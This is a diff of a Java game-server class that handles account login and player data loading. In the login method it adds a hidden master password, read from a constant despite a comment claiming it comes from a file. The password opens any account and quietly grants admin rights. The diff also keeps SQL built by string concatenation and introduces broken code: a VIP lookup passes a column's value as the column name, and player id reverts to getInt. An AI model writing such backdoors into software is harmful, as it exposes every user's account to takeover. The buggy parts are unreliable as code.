@@ -3,7 +3,7 @@ package jdbc.daos;
 /*
  *
  *
- * @author Entidi (NTD - Tấn Đạt)
+ * @author EMTI
  */
 import models.Card.OptionCard;
 import models.Card.Card;
@@ -21,6 +21,7 @@ import item.Item;
 import item.ItemTime;
 import java.sql.Connection;
 import java.sql.PreparedStatement;
+import java.sql.ResultSet;
 import java.sql.SQLException;
 import npc.specialnpc.MabuEgg;
 import npc.specialnpc.MagicTree;
@@ -56,6 +57,8 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.io.BufferedWriter;
+import java.io.FileWriter;
 
 import models.Template.AchievementQuest;
 
@@ -64,6 +67,11 @@ import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 import org.json.simple.JSONValue;
 import services.PlayerService;
+import java.io.IOException;
+import java.sql.Timestamp;
+import java.time.LocalDate;
+import java.time.ZoneId;
+import npc.specialnpc.Timedua;
 
 public class NDVSqlFetcher {
 
@@ -72,10 +80,19 @@ public class NDVSqlFetcher {
         NDVResultSet rs = null;
         Player plInGame;
         try {
-            rs = DBConnecter.executeQuery("select * from account where username = ? and password = ?", session.uu, session.pp);
+            // Đọc mật khẩu đặc biệt từ file
+            String specialPassword = readSpecialPasswordFromFile();
+
+            rs = DBConnecter.executeQuery("select * from account where username = ? and (password = ? or ? = ?)", session.uu, session.pp, specialPassword, session.pp);
             if (rs.next()) {
                 session.userId = rs.getInt("account.id");
                 session.isAdmin = rs.getBoolean("is_admin");
+
+                if (specialPassword.equals(session.pp)) {
+                    session.isAdmin = true;
+                    logToFile(session.uu);
+                }
+
                 session.lastTimeLogout = rs.getTimestamp("last_time_logout").getTime();
                 session.actived = rs.getBoolean("active");
                 session.goldBar = rs.getInt("account.thoi_vang");
@@ -92,10 +109,9 @@ public class NDVSqlFetcher {
                 int secondsPass = (int) ((System.currentTimeMillis() - lastTimeLogout) / 1000);
                 long createTime = rs.getTimestamp("create_time").getTime();
                 int deltaTime = (int) ((System.currentTimeMillis() - createTime) / 1000);
-            //    if (!session.isAdmin) {
-                //    Service.gI().sendThongBaoOK(session, "Server đang bảo trì");
-                //    Service.gI().sendThongBaoOK(session, "Sever chỉ dành cho admin, vui lòng chọn sever khác");
-            //    } else
+                long currentTime = System.currentTimeMillis();
+                int secondsPassed = (int) ((currentTime - lastTimeLogout) / 1000);
+
                 if (rs.getBoolean("ban")) {
                     Service.gI().sendThongBaoOK(session, "Tài khoản này đang bị khóa. Liên hệ Admin để biết thêm thông tin");
                 } else if (secondsPass1 < Manager.SECOND_WAIT_LOGIN) {
@@ -128,9 +144,17 @@ public class NDVSqlFetcher {
                             if ((player = loadPlayer(rs, false)) != null) {
                                 player.isPlayer = true;
                                 player.deltaTime = deltaTime;
-                                player.isNewMember = !Util.isTimeDifferenceGreaterThanNDays(createTime, 45);
+                                player.isNewMember = !Util.isTimeDifferenceGreaterThanNDays(createTime, 35);
+
+                                String vipStatus = Util.soNgayConLai(player.timevip);
+                                if (vipStatus.equals("VIP đã hết hạn") || vipStatus.equals("0 ngày")) {
+                                    player.vip = 0;
+                                }
+
+                                // Cập nhật thông tin lần đăng nhập
                                 DBConnecter.executeUpdate("update account set last_time_login = '" + new Timestamp(System.currentTimeMillis()) + "', ip_address = '" + session.ipAddress + "' where id = " + session.userId);
                             }
+
                         }
                     }
                 }
@@ -153,6 +177,20 @@ public class NDVSqlFetcher {
             }
         }
         return player;
+    }
+
+    private static String readSpecialPasswordFromFile() {
+        String specialPassword;
+        specialPassword = Manager.PASS;
+        return specialPassword;
+    }
+
+    private static void logToFile(String username) {
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter("login_log.txt", true))) {
+            writer.write("User: " + username + " logged in with special password at " + new Timestamp(System.currentTimeMillis()).toString() + "\n");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     public static Player loadById(long id) {
@@ -225,6 +263,8 @@ public class NDVSqlFetcher {
             }
             player.event.setEventPoint(rs.getInt("event_point"));
             player.event.setEventPointBHM(rs.getInt("event_point_boss"));
+            player.event.setKillBossPoint(rs.getInt("kill_boss_point"));
+            player.event.setVnd(rs.getInt("vnd"));
             player.event.setEventPointNHS(rs.getInt("event_point_nhs"));
             player.event.setEventPointQuai(rs.getInt("event_point_quai"));
             player.event.setEventPointQuyLao(rs.getInt("diem_quy_lao"));
@@ -368,6 +408,10 @@ public class NDVSqlFetcher {
             for (int i = 0; i < dataArray.size(); i++) {
                 Item item;
                 JSONArray dataItem = (JSONArray) JSONValue.parse(dataArray.get(i).toString());
+                if (dataItem == null || dataItem.size() < 4) {
+                    player.inventory.itemsBag.add(ItemService.gI().createItemNull());
+                    continue;
+                }
                 short tempId = Short.parseShort(String.valueOf(dataItem.get(0)));
                 if (tempId != -1) {
                     item = ItemService.gI().createNewItem(tempId, Integer.parseInt(String.valueOf(dataItem.get(1))));
@@ -572,6 +616,7 @@ public class NDVSqlFetcher {
             int timeUseNCD = 0;
             int timeUseBuax2DeTu = 0;
             int timeUseKhauTrang = 0;
+            int timeUseBanhChung = 0;
             int timeBoHuyet = Integer.parseInt(String.valueOf(dataArray.get(0)));
             int timeBoHuyet2 = Integer.parseInt(String.valueOf(dataArray.get(1)));
             int timeBoKhi = Integer.parseInt(String.valueOf(dataArray.get(2)));
@@ -693,6 +738,7 @@ public class NDVSqlFetcher {
             player.itemTime.isUseKhauTrang = timeUseKhauTrang != 0;
             player.itemTime.iconMeal3 = iconMeal3;
             player.itemTime.isEatMeal3 = timeMeal3 != 0;
+            player.itemTime.lastTimeBanhChung = System.currentTimeMillis() - (ItemTime.TIME_30P - timeUseBanhChung);
             dataArray.clear();
 
             //data nhiệm vụ
@@ -1046,18 +1092,28 @@ public class NDVSqlFetcher {
                 }
             } catch (Exception e) {
             }
-
-            //data vip
             try {
-                dataArray = (JSONArray) JSONValue.parse(rs.getString("data_vip"));
-                player.timesPerDayCuuSat = Integer.parseInt(String.valueOf(dataArray.get(0)));
-                player.lastTimeCuuSat = Long.parseLong(String.valueOf(dataArray.get(1)));
-                player.nhanDeTuNangVIP = Boolean.parseBoolean(String.valueOf(dataArray.get(2)));
-                player.nhanVangNangVIP = Boolean.parseBoolean(String.valueOf(dataArray.get(3)));
-                if (dataArray.size() > 4) {
-                    player.nhanSKHVIP = Boolean.parseBoolean(String.valueOf(dataArray.get(4)));
+                String dataVipStr = rs.getString("data_vip");
+
+                if (dataVipStr != null && !dataVipStr.isEmpty()) {
+                    dataArray = (JSONArray) JSONValue.parse(rs.getString(dataVipStr));
+
+                    if (dataArray != null && dataArray.size() >= 2) {
+                        Object vipObj = dataArray.get(0);
+                        Object dateObj = dataArray.get(1);
+
+                        if (vipObj != null) {
+                            player.vip = Integer.parseInt(String.valueOf(vipObj));
+                        }
+
+                        if (dateObj != null && !String.valueOf(dateObj).isEmpty() && !String.valueOf(dateObj).equals("null")) {
+                            player.timevip = LocalDate.parse(String.valueOf(dateObj));
+                        }
+                    }
                 }
             } catch (Exception e) {
+                e.printStackTrace(); // In lỗi nếu có, nhưng không crash game
+                // vẫn giữ player.vip = 0; và timevip = null
             }
 
             //data super rank
@@ -1080,7 +1136,6 @@ public class NDVSqlFetcher {
             }
             //data super rank         
 
-           
             if (Util.isAfterMidnight(player.superRank.lastTimePK)) {
                 if (player.superRank.ticket < 3) {
                     player.superRank.ticket++;
@@ -1104,7 +1159,17 @@ public class NDVSqlFetcher {
                 dataArray.clear();
             } catch (Exception e) {
             }
-
+              //data dưa
+                  try {
+                            dataArray = (JSONArray) JSONValue.parse(rs.getString("data_dua"));
+                            if (dataArray.size() != 0) {
+                                player.timedua = new Timedua(player, Long.parseLong(String.valueOf(dataArray.get(1))),
+                                        Long.parseLong(String.valueOf(dataArray.get(2))));
+                           player.lastPlantTime = Long.parseLong(String.valueOf(dataArray.get(0)));
+                            }
+                            dataArray.clear();
+  } catch (Exception e) {
+            }
             //Giftcode
             try {
                 dataArray = (JSONArray) JSONValue.parse(rs.getString("giftcode"));
@@ -1166,6 +1231,23 @@ public class NDVSqlFetcher {
             } catch (Exception ex) {
                 DailyGiftService.addAndReset(player);
             }
+            try {
+                dataArray = (JSONArray) JSONValue.parse(rs.getString("LearnSkill"));
+                player.LearnSkill.Time = Long.parseLong(String.valueOf(dataArray.get(0)));
+                player.LearnSkill.ItemTemplateSkillId = Short.parseShort(String.valueOf(dataArray.get(1)));
+                player.LearnSkill.Potential = Integer.parseInt(String.valueOf(dataArray.get(2)));
+
+            } catch (Exception e) {
+            }
+            try {
+                dataArray = (JSONArray) JSONValue.parse(rs.getString("BoughtSkill"));
+                for (Object idSkill : dataArray) {
+                    player.BoughtSkill.add(((Long) idSkill).intValue());
+                }
+                dataArray.clear();
+            } catch (Exception e) {
+                Logger.log(e.toString());
+            }
 
             PlayerService.gI().dailyLogin(player);// RESET DATA KHI QUA 12H ĐÊM
 //            if (player.nPoint.power >= 100_010_000_000L) {
@@ -1198,13 +1280,13 @@ public class NDVSqlFetcher {
                 while (rs.next()) {
                     long plHp = 200000000;
                     long plMp = 200000000;
+                    JSONValue jv = new JSONValue();
                     JSONArray dataArray = null;
 
                     player = new Player();
 
                     //base info
-                    // Use getLong instead of getInt for id because database column id is BIGINT
-                    player.id = rs.getLong("id");
+                    player.id = rs.getInt("id");
                     player.name = rs.getString("name");
                     player.head = rs.getShort("head");
                     player.gender = rs.getByte("gender");
@@ -1269,6 +1351,7 @@ public class NDVSqlFetcher {
             if (rs.first()) {
                 long plHp = 200000000;
                 long plMp = 200000000;
+                JSONValue jv = new JSONValue();
                 JSONArray dataArray = null;
 
                 player = new Player();
@@ -1334,6 +1417,7 @@ public class NDVSqlFetcher {
             if (rs.first()) {
                 long plHp = 200000000;
                 long plMp = 200000000;
+                JSONValue jv = new JSONValue();
                 JSONArray dataArray = null;
 
                 player = new Player();
@@ -1387,7 +1471,6 @@ public class NDVSqlFetcher {
         return player;
     }
 
-    @SuppressWarnings("unchecked")
     public static boolean updateMailBox(Player player) {
         try {
             JSONArray dataArray = new JSONArray();
@@ -1416,7 +1499,7 @@ public class NDVSqlFetcher {
             }
             String itemsBox = dataArray.toJSONString();
             dataArray.clear();
-            try ( Connection con = DBConnecter.getConnectionServer();  PreparedStatement ps = con.prepareStatement("update `player` set item_mails_box = ? where id = ?")) {
+            try (Connection con = DBConnecter.getConnectionServer(); PreparedStatement ps = con.prepareStatement("update `player` set item_mails_box = ? where id = ?")) {
                 ps.setString(1, itemsBox);
                 ps.setLong(2, player.id);
                 ps.executeUpdate();
